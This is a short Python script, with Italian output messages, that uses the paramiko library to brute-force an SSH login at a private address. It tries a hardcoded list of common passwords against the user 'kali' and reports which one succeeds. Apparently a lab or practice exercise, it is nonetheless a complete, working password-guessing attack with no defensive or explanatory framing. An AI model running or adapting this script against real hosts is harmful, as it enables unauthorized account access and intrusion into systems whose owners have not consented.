import paramiko
host = "192.168.1.95"
utente = "kali"
lista = ["123456", "password", "admin", "kali", "qwerty", "root123", "p@ssword", "letmein", "root123","changeme"]
for pwd in lista:
	try:
		client = paramiko.SSHClient()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		client.connect(hostname="192.168.1.95", username="kali", password=pwd, timeout=3,look_for_keys=False, allow_agent=False)
		print(f"[successo] password corretta trovata :{pwd}")
		client.close()
	except paramiko.AuthenticationException:
		print(f"[fallito] password errata: {pwd}")
